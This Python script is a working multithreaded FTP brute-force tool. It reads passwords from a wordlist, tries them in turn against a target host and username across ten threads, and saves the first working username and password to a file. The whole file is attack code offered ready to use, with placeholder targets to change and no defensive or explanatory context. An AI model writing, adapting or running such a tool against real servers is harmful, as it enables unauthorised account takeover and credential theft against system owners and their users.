import ftplib
import threading
import queue
from colorama import Fore, init

init(autoreset=True)

# Try login
def connect_ftp(host, user, pwd):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, 21, timeout=3)
        ftp.login(user, pwd)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except:
        return False


def worker(host, user, q):
    while not q.empty():
        pwd = q.get()
        print(f"Trying → {user}:{pwd}")

        if connect_ftp(host, user, pwd):
            print(Fore.GREEN + f"\n[+] SUCCESS → {user}:{pwd}\n")
            open("credentials.txt", "w").write(f"{user}:{pwd}")
            while not q.empty():  # clear remaining tasks
                q.get()
                q.task_done()
            return

        q.task_done()


def main():
    host = "127.0.0.1"    # Change this
    user = "admin"        # Change this
    passlist = "passlist.txt"

    # Load passwords
    with open(passlist, "r") as f:
        passwords = f.read().splitlines()

    q = queue.Queue()
    for pwd in passwords:
        q.put(pwd)

    print(Fore.CYAN + f"\nStarting FTP brute-force on {host} with username '{user}'\n")

    threads = []
    for _ in range(10):  # 10 threads
        t = threading.Thread(target=worker, args=(host, user, q))
        threads.append(t)
        t.start()

    q.join()


if __name__ == "__main__":
    main()
